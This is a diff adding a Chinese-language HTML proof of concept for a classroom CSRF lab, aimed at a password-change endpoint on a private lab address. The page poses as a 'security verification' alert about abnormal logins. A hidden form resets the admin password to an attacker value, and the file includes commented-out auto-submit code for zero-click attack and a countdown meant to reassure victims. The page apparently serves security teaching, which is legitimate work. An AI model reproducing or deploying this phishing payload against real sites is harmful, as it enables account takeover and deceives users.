@@ -1,0 +1,73 @@
+<!-- ===================================================================== -->
+<!-- CSRF钓鱼HTML POC — 对应课堂Burp CSRF PoC生成 + Ngrok内网穿透演示    -->
+<!-- 文件名: csrf_poc.html                                                  -->
+<!-- 攻击目标: http://192.168.126.133:5000/change-password                 -->
+<!-- 课堂知识点: CSRF Token缺失 -> 跨站请求伪造                              -->
+<!-- ===================================================================== -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>系统安全中心</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:Arial, sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .card { background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); padding:40px; max-width:420px; width:90%; text-align:center; }
+        .icon { font-size:48px; margin-bottom:16px; }
+        h2 { font-size:20px; color:#1a1a1a; margin-bottom:8px; }
+        p { font-size:14px; color:#666; margin-bottom:24px; line-height:1.6; }
+        .btn { display:inline-block; padding:12px 48px; font-size:16px; color:#fff; background:#1677ff; border:none; border-radius:8px; cursor:pointer; text-decoration:none; transition:background 0.2s; }
+        .btn:hover { background:#4096ff; }
+        .countdown { font-size:12px; color:#999; margin-top:16px; }
+        .warning { color:#cf1322; font-size:13px; margin-top:12px; border:1px solid #ffccc7; background:#fff2f0; padding:8px; border-radius:6px; display:none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🔒</div>
+        <h2>账号安全验证</h2>
+        <p>系统检测到您的账号存在异常登录行为<br>请点击下方按钮完成安全验证</p>
+
+        <!-- CSRF 隐藏表单 — 对应课堂Burp工具生成的标准CSRF PoC -->
+        <form id="csrf-form" action="http://192.168.126.133:5000/change-password" method="POST">
+            <!-- 攻击参数：向 admin 账号写入攻击者密码 -->
+            <input type="hidden" name="username" value="admin" />
+            <input type="hidden" name="old_password" value="admin123" />
+            <input type="hidden" name="new_password" value="attacker_controlled" />
+            <input type="hidden" name="confirm_password" value="attacker_controlled" />
+            <!-- 注意：修复后需携带 csrf_token 字段，攻击者无法获取 -->
+            <button type="submit" class="btn" id="submit-btn">立即验证</button>
+        </form>
+
+        <div class="countdown" id="countdown"></div>
+        <div class="warning" id="warning">⛔ 验证失败：CSRF攻击已被拦截</div>
+    </div>
+
+    <script>
+        // ===== 自动提交POC（对应课堂：NGROK自动CSRF攻击） =====
+        // 取消注释以下代码实现访问即攻击（零交互）
+        // window.onload = function() {
+        //     document.getElementById('csrf-form').submit();
+        // };
+
+        // 倒计时提示（缓和用户心理）
+        var seconds = 3;
+        var countdownEl = document.getElementById('countdown');
+        var interval = setInterval(function() {
+            if (seconds > 0) {
+                countdownEl.textContent = seconds + '秒后自动跳转...';
+                seconds--;
+            } else {
+                clearInterval(interval);
+                countdownEl.textContent = '正在验证...';
+            }
+        }, 1000);
+
+        // 捕获表单提交结果
+        document.getElementById('csrf-form').addEventListener('submit', function(e) {
+            // 如果被CSP或SameSite限制，提示拦截
+            document.getElementById('warning').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
